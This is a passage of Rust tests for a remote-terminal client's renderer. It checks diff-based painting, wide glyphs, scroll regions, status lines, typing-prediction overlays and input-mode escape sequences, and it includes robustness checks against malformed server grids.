        // Count climbs (possibly by more than one) → exactly one bell.
        let buf = oob_emit(&mut oob, &scr, win("", "", "", 3));
        assert_eq!(buf, b"\x07", "one bell on an increase, even if it jumped");
    }

    #[test]
    fn out_of_band_reasserts_input_modes_on_change() {
        let mut oob = OutOfBand::default();
        // Baseline frame in default modes.
        let _ = oob_emit(&mut oob, &screen_of(b""), win("", "", "", 0));

        // The remote turns on bracketed paste + mouse reporting → re-asserted to the real terminal.
        let modes = screen_of(b"\x1b[?2004h\x1b[?1000h");
        let buf = oob_emit(&mut oob, &modes, win("", "", "", 0));
        let s = String::from_utf8_lossy(&buf);
        assert!(s.contains("2004"), "bracketed-paste re-asserted, got {s:?}");
        assert!(s.contains("1000"), "mouse reporting re-asserted, got {s:?}");
    }

    #[test]
    fn renders_status_line() {
        let s = render_to_string(&screen_of(b""), &Overlay::empty(), Some("link down"));
        assert!(s.contains("link down"));
    }

    #[test]
    fn status_line_truncation_is_panic_free_across_all_widths() {
        // The peer-controlled (clamped) screen width must never make the multi-byte status
        // line panic via a mid-UTF-8 `String::truncate`. Sweep every width in [MIN_DIM, MAX_DIM]
        // with the real link-down banner (em-dash U+2014 + ellipsis U+2026, whose bytes straddle
        // widths 18/19/30/31) and assert render() never panics.
        use crate::terminal::{MAX_DIM, MIN_DIM};
        let status = "[koh] link down — resuming… 5s";
        for cols in MIN_DIM..=MAX_DIM {
            let screen = crate::terminal::TerminalScreen::from_bytes(MIN_DIM, cols, b"x")
                .screen()
                .clone();
            let mut backend = CaptureBackend::default();
            Painter::default()
                .render(&mut backend, &screen, &Overlay::empty(), Some(status))
                .expect("render must not error or panic at any width");
        }
    }

    /// Paint one frame with `painter` and return the bytes, as a lossy string.
    fn paint_frame(
        painter: &mut Painter,
        screen: &Grid,
        overlay: &Overlay<'_>,
        status: Option<&str>,
    ) -> String {
        let mut backend = CaptureBackend::default();
        painter
            .render(&mut backend, screen, overlay, status)
            .unwrap();
        String::from_utf8_lossy(&backend.bytes).into_owned()
    }

    /// The bytes around a frame's cells: open the synchronized frame, then after the cells place
    /// the cursor at the 1-based `cursor`, show it, and close the frame.
    fn framed(cells: &str, cursor: &str) -> String {
        format!("\x1b[?2026h\x1b[?25l{cells}\x1b[{cursor}H\x1b[?25h\x1b[?2026l")
    }

    /// What `set_style` emits for the default style.
    const PLAIN: &str = "\x1b[m\x1b[39m\x1b[49m";

    #[test]
    fn a_second_identical_frame_paints_no_cells() {
        let screen = screen_of(b"hello");
        let mut painter = Painter::default();
        let first = paint_frame(&mut painter, &screen, &Overlay::empty(), None);
        assert!(first.contains("hello"));
        let second = paint_frame(&mut painter, &screen, &Overlay::empty(), None);
        assert_eq!(second, framed("", "1;6"));
    }

    #[test]
    fn one_changed_cell_paints_only_that_cell() {
        let mut painter = Painter::default();
        paint_frame(&mut painter, &screen_of(b"hello"), &Overlay::empty(), None);
        let changed = paint_frame(&mut painter, &screen_of(b"hellO"), &Overlay::empty(), None);
        assert_eq!(changed, framed(&format!("\x1b[1;5H{PLAIN}O\x1b[m"), "1;6"));
    }

    #[test]
    fn the_cursor_moves_only_to_reach_a_changed_cell() {
        // Two changed cells either side of an unchanged wide glyph: the second needs a move, and
        // the glyph between them is not painted.
        let mut painter = Painter::default();
        paint_frame(
            &mut painter,
            &screen_of("a日b".as_bytes()),
            &Overlay::empty(),
            None,
        );
        let changed = paint_frame(
            &mut painter,
            &screen_of("c日d".as_bytes()),
            &Overlay::empty(),
            None,
        );
        assert_eq!(
            changed,
            framed(&format!("\x1b[1;1H{PLAIN}c\x1b[1;4Hd\x1b[m"), "1;5")
        );
        // A changed wide glyph is painted whole, and the cell after it follows without a move.
        paint_frame(
            &mut painter,
            &screen_of("日本x".as_bytes()),
            &Overlay::empty(),
            None,
        );
        let changed = paint_frame(
            &mut painter,
            &screen_of("日字y".as_bytes()),
            &Overlay::empty(),
            None,
        );
        assert_eq!(
            changed,
            framed(&format!("\x1b[1;3H{PLAIN}字y\x1b[m"), "1;6")
        );
    }

    #[test]
    fn a_resize_a_resume_or_a_small_terminal_repaints_everything() {
        let screen = screen_of(b"hello");
        let whole = render_to_string(&screen, &Overlay::empty(), None);
        let mut painter = Painter::default();
        paint_frame(&mut painter, &screen, &Overlay::empty(), None);
        // A resume (or a window resize) invalidates what was painted.
        painter.invalidate();
        assert_eq!(
            paint_frame(&mut painter, &screen, &Overlay::empty(), None),
            whole
        );
        // A screen of another size.
        let small = crate::terminal::TerminalScreen::from_bytes(10, 40, b"hello")
            .screen()
            .clone();
        assert_eq!(
            paint_frame(&mut painter, &small, &Overlay::empty(), None),
            render_to_string(&small, &Overlay::empty(), None)
        );
        // A screen larger than the terminal, where cells do not land where they are painted.
        let large = crate::terminal::TerminalScreen::from_bytes(30, 100, b"hello")
            .screen()
            .clone();
        let whole = render_to_string(&large, &Overlay::empty(), None);
        for _ in 0..2 {
            assert_eq!(
                paint_frame(&mut painter, &large, &Overlay::empty(), None),
                whole
            );
        }
    }

    #[test]
    fn the_status_line_appearing_or_going_repaints_everything() {
        let screen = screen_of(b"hello");
        let mut painter = Painter::default();
        paint_frame(&mut painter, &screen, &Overlay::empty(), None);
        assert_eq!(
            paint_frame(&mut painter, &screen, &Overlay::empty(), Some("down")),
            render_to_string(&screen, &Overlay::empty(), Some("down"))
        );
        // While it stays, only its row is repainted, under the new text.
        let again = paint_frame(&mut painter, &screen, &Overlay::empty(), Some("down 2s"));
        assert!(again.contains("\x1b[24;1H") && again.contains(" down 2s "));
        assert!(!again.contains("hello"), "{again:?}");
        assert_eq!(
            paint_frame(&mut painter, &screen, &Overlay::empty(), None),
            render_to_string(&screen, &Overlay::empty(), None)
        );
    }

    #[test]
    fn a_prediction_is_painted_and_cleared_like_a_cell() {
        let screen = screen_of(b"ab");
        let predicted = Overlay::of(
            [(
                (0, 2),
                PredictedCell {
                    glyph: "Z",
                    fg: Color::Default,
                    bg: Color::Default,
                    covered: false,
                },
            )],
            Some((0, 3)),
        );
        let mut painter = Painter::default();
        paint_frame(&mut painter, &screen, &Overlay::empty(), None);
        assert_eq!(
            paint_frame(&mut painter, &screen, &predicted, None),
            framed(&format!("\x1b[1;3H{PLAIN}Z\x1b[m"), "1;4")
        );
        assert_eq!(
            paint_frame(&mut painter, &screen, &Overlay::empty(), None),
            framed(&format!("\x1b[1;3H{PLAIN} \x1b[m"), "1;3")
        );
    }

    /// A predicted glyph at `(row, col)`, and when it is wide the cell it covers.
    fn predicted(row: u16, col: u16, glyph: &str) -> Vec<((u16, u16), PredictedCell<'_>)> {
        let cell = |glyph, covered| PredictedCell {
            glyph,
            fg: Color::Default,
            bg: Color::Default,
            covered,
        };
        let mut cells = vec![((row, col), cell(glyph, false))];
        if glyph.width() == 2 {
            cells.push(((row, col.saturating_add(1)), cell("", true)));
        }
        cells
    }

    #[test]
    fn a_predicted_wide_glyph_paints_only_itself() {
        // Over narrow cells, then gone: each frame paints only the cells that changed.
        let screen = screen_of(b"abcd");
        let wide = Overlay::of(predicted(0, 1, "世"), None);
        let mut painter = Painter::default();
        paint_frame(&mut painter, &screen, &Overlay::empty(), None);
        assert_eq!(
            paint_frame(&mut painter, &screen, &wide, None),
            framed(&format!("\x1b[1;2H{PLAIN}世\x1b[m"), "1;5")
        );
        assert_eq!(
            paint_frame(&mut painter, &screen, &Overlay::empty(), None),
            framed(&format!("\x1b[1;2H{PLAIN}bc\x1b[m"), "1;5")
        );
    }

    #[test]
    fn a_predicted_narrow_glyph_over_a_wide_cell_blanks_its_right_half() {
        // What a terminal shows once the server echoes the same glyph there.
        let screen = screen_of("本x".as_bytes());
        let narrow = Overlay::of(predicted(0, 0, "a"), Some((0, 1)));
        let mut painter = Painter::default();
        paint_frame(&mut painter, &screen, &Overlay::empty(), None);
        let painted = paint_frame(&mut painter, &screen, &narrow, None);
        assert_eq!(painted, framed(&format!("\x1b[1;1H{PLAIN}a \x1b[m"), "1;2"));
        let mut terminal = fux_vt::Parser::new(24, 80, 0).unwrap();
        terminal
            .process(render_to_string(&screen, &Overlay::empty(), None).as_bytes())
            .unwrap();
        terminal.process(painted.as_bytes()).unwrap();
        let echo = render_to_string(
            &screen_of("本x\x1b[1;1Ha".as_bytes()),
            &Overlay::empty(),
            None,
        );
        let mut echoed = fux_vt::Parser::new(24, 80, 0).unwrap();
        echoed.process(echo.as_bytes()).unwrap();
        assert_eq!(shown(&terminal), shown(&echoed));
    }

    /// Paint `grid` with `overlay` through `painter` into `terminal`, 6×20.
    #[test]
    fn a_modifier_placed_in_a_cell_of_its_own_is_not_joined_to_the_glyph_before_it() {
        // vim places 👍 and then 🏽 with a cursor move between them, so the screen holds two
        // cells; printed one after the other they would be one cluster on the user's terminal.
        let at = |bytes: &[u8]| {
            crate::terminal::TerminalScreen::from_bytes(6, 20, bytes)
                .screen()
                .clone()
        };
        let two = at("\u{1f44d}\x1b[1;3H\u{1f3fd}".as_bytes());
        let looks = |terminal: &fux_vt::Parser| {
            [0, 2].map(|col| {
                terminal
                    .screen()
                    .cell(0, col)
                    .map(|c| c.contents().to_owned())
            })
        };
        let expected = [Some("\u{1f44d}".to_owned()), Some("\u{1f3fd}".to_owned())];
        // Painted whole.
        let mut terminal = fux_vt::Parser::new(6, 20, 0).unwrap();
        paint_into(
            &mut Painter::default(),
            &mut terminal,
            &two,
            &Overlay::empty(),
        );
        assert_eq!(looks(&terminal), expected);
        // Painted as a change: the two cells after one another on a row painted before.
        let mut painter = Painter::default();
        let mut terminal = fux_vt::Parser::new(6, 20, 0).unwrap();
        paint_into(&mut painter, &mut terminal, &at(b"ab"), &Overlay::empty());
        paint_into(&mut painter, &mut terminal, &two, &Overlay::empty());
        assert_eq!(looks(&terminal), expected);
    }

    #[test]
    fn a_programs_colours_are_painted_without_changing_the_users_palette() {
        let screen = crate::terminal::TerminalScreen::from_bytes(
            6,
            20,
            b"\x1b]4;1;#ff0000\x07\x1b]11;#000080\x07\x1b[31mR",
        );
        let mut backend = CaptureBackend {
            size: Size::new(6, 20),
            ..CaptureBackend::default()
        };
        Painter::default()
            .render(&mut backend, screen.screen(), &Overlay::empty(), None)
            .unwrap();
        let painted = String::from_utf8_lossy(&backend.bytes).into_owned();
        for osc in ["\x1b]4", "\x1b]10", "\x1b]11", "\x1b]104", "\x1b]11"] {
            assert!(!painted.contains(osc), "{osc:?} sent: {painted:?}");
        }
        let options = fux_vt::Options::new().with_palette(true);
        let mut terminal = fux_vt::Parser::with_options(6, 20, 0, options).unwrap();
        terminal.process(&backend.bytes).unwrap();
        assert!(!terminal.screen().colors_changed(), "the user's palette");
        let cell = terminal.screen().cell(0, 0).unwrap();
        assert_eq!(
            (cell.contents(), cell.fgcolor(), cell.bgcolor()),
            ("R", Color::Rgb(0xff, 0, 0), Color::Rgb(0, 0, 0x80))
        );
    }

    fn paint_into(
        painter: &mut Painter,
        terminal: &mut fux_vt::Parser,
        grid: &Grid,
        overlay: &Overlay<'_>,
    ) {
        let mut backend = CaptureBackend {
            size: Size::new(6, 20),
            ..CaptureBackend::default()
        };
        painter.render(&mut backend, grid, overlay, None).unwrap();
        terminal.process(&backend.bytes).unwrap();
    }

    /// Type `typed` where the program shows `before` (once a first keystroke confirmed that it
    /// echoes), and paint the predictions; then let the program echo it with `echo` and paint
    /// that. The terminal showed with the predictions exactly what it shows with the echo, the
    /// cursor included, and the echo confirms every prediction.
    fn predicted_typing_shows_the_echo(before: &str, typed: &str, echo: &str) {
        let mut emu = crate::terminal::ServerTerminal::new(6, 20, 0).unwrap();
        let mut engine = PredictionEngine::new(DisplayPreference::Always);
        engine.set_local_frame_sent(0);
        engine.new_user_byte(b'>', emu.snapshot().screen());
        emu.process(b">");
        engine.set_local_frame_late_acked(1);
        engine.cull(emu.snapshot().screen());
        emu.process(before.as_bytes());
        let screen = emu.snapshot();

        let mut painter = Painter::default();
        let mut terminal = fux_vt::Parser::new(6, 20, 0).unwrap();
        paint_into(
            &mut painter,
            &mut terminal,
            screen.screen(),
            &Overlay::empty(),
        );
        engine.set_local_frame_sent(1);
        for &byte in typed.as_bytes() {
            engine.new_user_byte(byte, screen.screen());
        }
        let overlay = engine.overlay();
        assert!(overlay.cells().count() > 0, "{typed:?} is predicted");
        paint_into(&mut painter, &mut terminal, screen.screen(), &overlay);
        let predicted = shown(&terminal);

        emu.process(echo.as_bytes());
        let echoed = emu.snapshot();
        let confirmed = engine.confirmed_epoch();
        engine.set_local_frame_late_acked(2);
        engine.cull(echoed.screen());
        assert!(
            engine.overlay().is_empty(),
            "{typed:?}: every prediction graded"
        );
        assert!(
            engine.confirmed_epoch() >= confirmed,
            "{typed:?}: nothing killed"
        );
        let mut whole = fux_vt::Parser::new(6, 20, 0).unwrap();
        paint_into(
            &mut Painter::default(),
            &mut whole,
            echoed.screen(),
            &Overlay::empty(),
        );
        assert_eq!(predicted, shown(&whole), "{before:?} then {typed:?}");
        // Painting the echo over the predictions changes nothing the terminal shows.
        paint_into(
            &mut painter,
            &mut terminal,
            echoed.screen(),
            &engine.overlay(),
        );
        assert_eq!(shown(&terminal), shown(&whole), "{before:?} then {typed:?}");
    }

    #[test]
    fn typing_wide_glyphs_shows_what_the_echo_shows() {
        // A terminal echoes a typed glyph where the cursor is, over what was there.
        for (before, typed) in [
            // Over blank cells.
            ("", "日本\u{1f980}"),
            // Over narrow text.
            ("abcdefgh\x1b[1;2H", "日"),
            ("abcdef\x1b[1;4H", "\u{1f980}"),
            // Over wide text, on its glyphs and across them.
            ("本本本\x1b[1;2H", "日"),
            ("本本本\x1b[1;3H", "日"),
            ("a本本\x1b[1;2H", "日\u{1f980}"),
        ] {
            predicted_typing_shows_the_echo(before, typed, typed);
        }
    }

    #[test]
    fn typing_before_wide_glyphs_moves_them_whole() {
        // A line editor inserts a typed glyph, moving the rest of the line right, wide glyphs and
        // all: here as insert-character then the glyph.
        predicted_typing_shows_the_echo("本本x\x1b[1;2H", "a", "\x1b[@a");
        predicted_typing_shows_the_echo("ab本c\x1b[1;3H", "z", "\x1b[@z");
    }

    #[test]
    fn a_cluster_a_variation_selector_widens_is_painted_in_place() {
        // "❤️" is two narrow characters that fux-vt keeps as one wide cell; measured as a string it
        // fills that cell exactly, so a change elsewhere paints only itself.
        let mut painter = Painter::default();
        paint_frame(
            &mut painter,
            &screen_of("\u{2764}\u{fe0f}ab".as_bytes()),
            &Overlay::empty(),
            None,
        );
        let changed = paint_frame(
            &mut painter,
            &screen_of("\u{2764}\u{fe0f}aB".as_bytes()),
            &Overlay::empty(),
            None,
        );
        assert_eq!(changed, framed(&format!("\x1b[1;4H{PLAIN}B\x1b[m"), "1;5"));
    }

    #[test]
    fn a_malformed_grid_repaints_everything_twice() {
        // A hostile server's wide glyph in the last column, which the terminal cannot show where
        // the grid puts it: it lays the row out its own way, so that frame and the next are painted
        // whole.
        use crate::terminal::{CellKind, CellText, RowDiff, Run, TerminalScreen, WireCell};
        use crate::terminal::{WireColor, WireStyle};
        let blank = TerminalScreen::from_bytes(24, 80, b"ab");
        let cell = |text, kind| WireCell {
            text: CellText::new(text).unwrap(),
            kind,
            fg: WireColor::Default,
            bg: WireColor::Default,
            underline_color: WireColor::Default,
            style: WireStyle::default(),
        };
        let mut diff = blank.diff_from(&blank);
        diff.rows = vec![RowDiff {
            row: 0,
            wrapped: false,
            runs: vec![
                Run {
                    count: std::num::NonZeroU16::new(79).unwrap(),
                    cell: cell("", CellKind::Narrow),
                },
                Run {
                    count: std::num::NonZeroU16::MIN,
                    cell: cell("世", CellKind::Wide),
                },
            ],
        }];
        let mut malformed = blank.clone();
        malformed.apply(&diff);
        let malformed = malformed.screen().clone();
        assert!(malformed.cell(0, 79).is_some_and(|c| c.is_wide()));
        let mut painter = Painter::default();
        paint_frame(&mut painter, blank.screen(), &Overlay::empty(), None);
        assert_eq!(
            paint_frame(&mut painter, &malformed, &Overlay::empty(), None),
            render_to_string(&malformed, &Overlay::empty(), None)
        );
        assert_eq!(
            paint_frame(&mut painter, blank.screen(), &Overlay::empty(), None),
            render_to_string(blank.screen(), &Overlay::empty(), None)
        );
        assert_eq!(
            paint_frame(&mut painter, blank.screen(), &Overlay::empty(), None),
            framed("", "1;3")
        );
    }

    /// The text of row `row` of [`lettered`]: a letter repeated, so no two rows share a cell.
    fn letters(row: u8) -> String {
        char::from(b'a'.saturating_add(row)).to_string().repeat(12)
    }

    /// Six rows of letters, 6×20.
    fn lettered() -> crate::terminal::ServerTerminal {
        let mut emu = crate::terminal::ServerTerminal::new(6, 20, 0).unwrap();
        for (row, line) in (0..6).zip(1..) {
            emu.process(format!("\x1b[{line};1H{}", letters(row)).as_bytes());
        }
        emu
    }

    /// The bytes painting `more` after the screen `emu` shows, on a terminal of its size.
    fn after(
        emu: &mut crate::terminal::ServerTerminal,
        more: &[u8],
        status: Option<&str>,
    ) -> String {
        let size = Size::new(6, 20);
        let mut painter = Painter::default();
        let mut backend = CaptureBackend {
            size,
            ..CaptureBackend::default()
        };
        painter
            .render(
                &mut backend,
                emu.snapshot().screen(),
                &Overlay::empty(),
                status,
            )
            .unwrap();
        emu.process(more);
        let mut backend = CaptureBackend {
            size,
            ..CaptureBackend::default()
        };
        painter
            .render(
                &mut backend,
                emu.snapshot().screen(),
                &Overlay::empty(),
                status,
            )
            .unwrap();
        String::from_utf8_lossy(&backend.bytes).into_owned()
    }

    #[test]
    fn a_scroll_scrolls_the_terminal_and_paints_only_the_new_row() {
        let mut emu = lettered();
        let painted = after(&mut emu, format!("\r\n{}", letters(6)).as_bytes(), None);
        assert_eq!(
            painted,
            framed(
                &format!(
                    "\x1b[m\x1b[1;6r\x1b[1S\x1b[r\x1b[6;1H{PLAIN}{}\x1b[m",
                    letters(6)
                ),
                "6;13"
            )
        );
    }

    #[test]
    fn a_scroll_region_and_inserted_lines_scroll_only_their_rows() {
        // A region of rows 2..=5 scrolled up, a line inserted at row 3 (down to the bottom).
        let mut emu = lettered();
        let painted = after(&mut emu, b"\x1b[2;5r\x1b[5;1H\n", None);
        assert!(painted.contains("\x1b[2;5r\x1b[1S\x1b[r"), "{painted:?}");
        assert!(!painted.contains("aaa"), "no row repainted: {painted:?}");
        let mut emu = lettered();
        let painted = after(&mut emu, b"\x1b[3;1H\x1b[L", None);
        assert!(painted.contains("\x1b[3;6r\x1b[1T\x1b[r"), "{painted:?}");
        assert!(!painted.contains("aaa"), "no row repainted: {painted:?}");
    }

    #[test]
    fn a_scroll_that_would_write_more_than_it_saves_is_not_made() {
        // Rows that all read the same: in place, the scrolled rows already show what they would
        // bring, so only the new row is painted, and nothing scrolls.
        let mut emu = crate::terminal::ServerTerminal::new(6, 20, 0).unwrap();
        for row in 1..=6 {
            emu.process(format!("\x1b[{row};1Hthe same").as_bytes());
        }
        let painted = after(&mut emu, b"\r\nthe same", None);
        assert_eq!(painted, framed("", "6;9"));
    }

    #[test]
    fn the_status_line_row_never_scrolls() {
        let mut emu = lettered();
        let painted = after(
            &mut emu,
            format!("\r\n{}", letters(6)).as_bytes(),
            Some("down"),
        );
        // Rows 1..=5 scroll; row 5 then shows what the status line hid, and the status line's row
        // is repainted whole, under it.
        assert!(painted.contains("\x1b[1;5r\x1b[1S\x1b[r"), "{painted:?}");
        assert!(
            painted.contains(&format!("\x1b[5;1H{PLAIN}{}", letters(5))),
            "{painted:?}"
        );
        assert!(
            painted.contains(&format!(
                "\x1b[6;1H{}        \x1b[m\x1b[6;1H\x1b[7m down ",
                letters(6)
            )),
            "{painted:?}"
        );
    }

    #[test]
    fn a_terminal_larger_than_the_screen_is_not_scrolled() {
        let mut emu = lettered();
        let mut painter = Painter::default();
        let size = Size::new(8, 30);
        let mut backend = CaptureBackend {
            size,
            ..CaptureBackend::default()
        };
        painter
            .render(
                &mut backend,
                emu.snapshot().screen(),
                &Overlay::empty(),
                None,
            )
            .unwrap();
        emu.process(format!("\r\n{}", letters(6)).as_bytes());
        let mut backend = CaptureBackend {
            size,
            ..CaptureBackend::default()
        };
        painter
            .render(
                &mut backend,
                emu.snapshot().screen(),
                &Overlay::empty(),
                None,
            )
            .unwrap();
        let painted = String::from_utf8_lossy(&backend.bytes);
        assert!(!painted.contains("\x1b[r"), "{painted:?}");
        assert!(painted.contains(&letters(6)), "{painted:?}");
    }

    /// Output that exercises what a frame can change: text, wide glyphs, combining marks, clusters
    /// (a ZWJ family, a flag, a heart a variation selector widens), colours and every attribute,
    /// cursor motion, erasing, scrolling (the whole screen and in a region, up and down),
    /// inserting and deleting lines, wrapping.
    const PIECES: [&str; 36] = [
        "\u{1f468}\u{200d}\u{1f469}\u{200d}\u{1f467}",
        "\u{1f1fa}\u{1f1f8}",
        "\u{2764}\u{fe0f}",
        "\x1b[5;9m",
        "\x1b[6m",
        "\x1b[8m",
        "\x1b[4;58;5;9m",
        "a",
        "xyz",
        "日",
        "本",
        "é",
        "e\u{301}",
        "\u{1f980}",
        "\r\n",
        "\x1b[31m",
        "\x1b[1;7m",
        "\x1b[44m",
        "\x1b[m",
        "\x1b[H",
        "\x1b[2J",
        "\x1b[3;7H",
        "\x1b[K",
        "\x1b[2L",
        "\x1b[M",
        "\x1b[S",
        "\x1b[19G",
        "\x1b[?25l\x1b[?25h",
        "a line that wraps past the edge",
        "\x1b[6;1H\r\n",
        "\x1b[2;5r",
        "\x1b[r",
        "\x1b[5;1H\n",
        "\x1b[2;1H\x1bM",
        "\x1b[2T",
        "\x1b[3;1H\x1b[L",
    ];

    /// Predicted glyphs, two of them wide.
    const GLYPHS: [&str; 5] = ["Z", "", "ü", "世", "\u{1f980}"];

    /// Status lines of several lengths.
    const STATUSES: [&str; 3] = [
        "[koh] link down \u{2014} 10s",
        "[koh] link down \u{2014} 9s",
        "x",
    ];

    /// What a cell shows: its text, whether it is either half of a wide glyph, its attributes.
    type Look = (String, bool, bool, fux_vt::Attributes);

    /// The cells and cursor a terminal shows. A printed space shows what an erased cell of its
    /// attributes does, the blank a whole repaint prints and a scroll brings in, so it counts as
    /// one.
    fn shown(terminal: &fux_vt::Parser) -> (Vec<Option<Look>>, (u16, u16)) {
        let screen = terminal.screen();
        let (rows, cols) = screen.size();
        let cells = (0..rows)
            .flat_map(|row| (0..cols).map(move |col| (row, col)))
            .map(|(row, col)| {
                screen.cell(row, col).map(|cell| {
                    let text = if cell.contents() == " " {
                        ""
                    } else {
                        cell.contents()
                    };
                    (
                        text.to_owned(),
                        cell.is_wide(),
                        cell.is_wide_continuation(),
                        cell.attributes(),
                    )
                })
            })
            .collect();
        (cells, screen.cursor_position())
    }

    proptest::proptest! {
        #![proptest_config(proptest::prelude::ProptestConfig::with_cases(128))]

        /// A terminal fed only what changed shows, after every frame, exactly what a terminal fed
        /// every frame whole shows: on a terminal the screen's size and on a larger one.
        #[test]
        fn painting_what_changed_shows_what_painting_everything_shows(
            steps in proptest::collection::vec(
                (
                    proptest::collection::vec(0..PIECES.len(), 0..6),
                    proptest::option::of(0..STATUSES.len()),
                    proptest::collection::vec((0u16..6, 0u16..20, 0..GLYPHS.len()), 0..4),
                    proptest::prelude::any::<bool>(),
                ),
                1..12,
            ),
            larger in proptest::prelude::any::<bool>(),
        ) {
            let (rows, cols) = (6, 20);
            let size = if larger { Size::new(8, 30) } else { Size::new(rows, cols) };
            let mut emu = crate::terminal::ServerTerminal::new(rows, cols, 0).unwrap();
            let mut painter = Painter::default();
            let mut incremental = fux_vt::Parser::new(size.rows, size.cols, 0).unwrap();
            let mut whole = fux_vt::Parser::new(size.rows, size.cols, 0).unwrap();
            for (pieces, status, predictions, whole_glyphs) in steps {
                for piece in pieces {
                    emu.process(PIECES[piece].as_bytes());
                }
                let screen = emu.snapshot();
                // Wide glyphs cover the next cell, as the predictor makes them; or, now and then, not,
                // which the terminal lays out its own way.
                let overlay = Overlay::of(
                    predictions.into_iter().flat_map(|(row, col, glyph)| {
                        let glyph = GLYPHS[glyph];
                        let cell = |glyph, covered| PredictedCell {
                            glyph,
                            fg: Color::Idx(2),
                            bg: Color::Default,
                            covered,
                        };
                        let next = col.saturating_add(1);
                        let covered = (whole_glyphs && glyph.width() == 2 && next < cols)
                            .then(|| ((row, next), cell("", true)));
                        std::iter::once(((row, col), cell(glyph, false))).chain(covered)
                    }),
                    None,
                );
                let status = status.map(|status| STATUSES[status]);
                let mut changed = CaptureBackend { size, ..CaptureBackend::default() };
                painter.render(&mut changed, screen.screen(), &overlay, status).unwrap();
                let mut everything = CaptureBackend { size, ..CaptureBackend::default() };
                Painter::default()
                    .render(&mut everything, screen.screen(), &overlay, status)
                    .unwrap();
                incremental.process(&changed.bytes).unwrap();
                whole.process(&everything.bytes).unwrap();
                proptest::prop_assert_eq!(shown(&incremental), shown(&whole));
            }
        }
    }

    #[test]
    fn renders_prediction_overlay_glyph() {
        // A predicted glyph (once the server has confirmed it echoes) must appear in the output.
        // Predictions are epoch-gated and hidden until confirmed, so confirm a first keystroke,
        // then a subsequent typed char becomes visible and should render.
        let mut pe = PredictionEngine::new(DisplayPreference::Always);
        pe.set_local_frame_sent(0);
        let blank = screen_of(b"");
        pe.new_user_byte(b'a', &blank); // hidden (epoch 1, unconfirmed)
        let echoed = screen_of(b"a");
        pe.set_local_frame_late_acked(1);
        pe.cull(&echoed); // confirms -> confirmed_epoch = 1

        pe.set_local_frame_sent(1);
        pe.new_user_byte(b'Z', &echoed); // now visible at (0,1)
        let overlay = pe.overlay();
        assert!(
            !overlay.is_empty(),
            "confirmed prediction should be visible"
        );

        let s = render_to_string(&echoed, &overlay, None);
        assert!(s.contains('Z'), "predicted glyph not rendered");
        assert!(!s.contains("\x1b[4m"), "predictions are not underlined");
    }

    // --- InputModes emits vt100 0.16's input-mode bytes ---

    #[test]
    fn input_modes_formatted_and_diff_match_the_vt100_oracle() {
        // Reference bytes from vt100 0.16.2's `input_mode_formatted` / `input_mode_diff`: the local
        // terminal must see exactly these.
        let seqs: [&[u8]; 6] = [
            b"",
            b"\x1b[?2004h",
            b"\x1b[?1000h\x1b[?1006h",
            b"\x1b[?1003h\x1b[?1005h\x1b[?1h\x1b=",
            b"\x1b[?1002h\x1b[?2004h",
            b"\x1b[?9h",
        ];
        let formatted: [&str; 6] = [
            "\x1b>\x1b[?1l\x1b[?2004l",
            "\x1b>\x1b[?1l\x1b[?2004h",
            "\x1b>\x1b[?1l\x1b[?2004l\x1b[?1000h\x1b[?1006h",
            "\x1b=\x1b[?1h\x1b[?2004l\x1b[?1003h\x1b[?1005h",
            "\x1b>\x1b[?1l\x1b[?2004h\x1b[?1002h",
            "\x1b>\x1b[?1l\x1b[?2004l\x1b[?9h",
        ];
        let diff: [[&str; 6]; 6] = [
            [
                "",
                "\x1b[?2004l",
                "\x1b[?1000l\x1b[?1006l",
                "\x1b>\x1b[?1l\x1b[?1003l\x1b[?1005l",
                "\x1b[?2004l\x1b[?1002l",
                "\x1b[?9l",
            ],
            [
                "\x1b[?2004h",
                "",
                "\x1b[?2004h\x1b[?1000l\x1b[?1006l",
                "\x1b>\x1b[?1l\x1b[?2004h\x1b[?1003l\x1b[?1005l",
                "\x1b[?1002l",
                "\x1b[?2004h\x1b[?9l",
            ],
            [
                "\x1b[?1000h\x1b[?1006h",
                "\x1b[?2004l\x1b[?1000h\x1b[?1006h",
                "",
                "\x1b>\x1b[?1l\x1b[?1000h\x1b[?1006h",
                "\x1b[?2004l\x1b[?1000h\x1b[?1006h",
                "\x1b[?1000h\x1b[?1006h",
            ],
            [
                "\x1b=\x1b[?1h\x1b[?1003h\x1b[?1005h",
                "\x1b=\x1b[?1h\x1b[?2004l\x1b[?1003h\x1b[?1005h",
                "\x1b=\x1b[?1h\x1b[?1003h\x1b[?1005h",
                "",
                "\x1b=\x1b[?1h\x1b[?2004l\x1b[?1003h\x1b[?1005h",
                "\x1b=\x1b[?1h\x1b[?1003h\x1b[?1005h",
            ],
            [
                "\x1b[?2004h\x1b[?1002h",
                "\x1b[?1002h",
                "\x1b[?2004h\x1b[?1002h\x1b[?1006l",
                "\x1b>\x1b[?1l\x1b[?2004h\x1b[?1002h\x1b[?1005l",
                "",
                "\x1b[?2004h\x1b[?1002h",
            ],
            [
                "\x1b[?9h",
                "\x1b[?2004l\x1b[?9h",
                "\x1b[?9h\x1b[?1006l",
                "\x1b>\x1b[?1l\x1b[?9h\x1b[?1005l",
                "\x1b[?2004l\x1b[?9h",
                "",
            ],
        ];
        let modes: Vec<InputModes> = seqs
            .iter()
            .map(|s| InputModes::from(&screen_of(s)))
            .collect();
        for (i, cur) in modes.iter().enumerate() {
            assert_eq!(cur.formatted(), formatted[i].as_bytes(), "formatted {i}");
            for (j, prev) in modes.iter().enumerate() {
                assert_eq!(cur.diff(*prev), diff[i][j].as_bytes(), "diff {i} from {j}");
            }
        }
    }
}
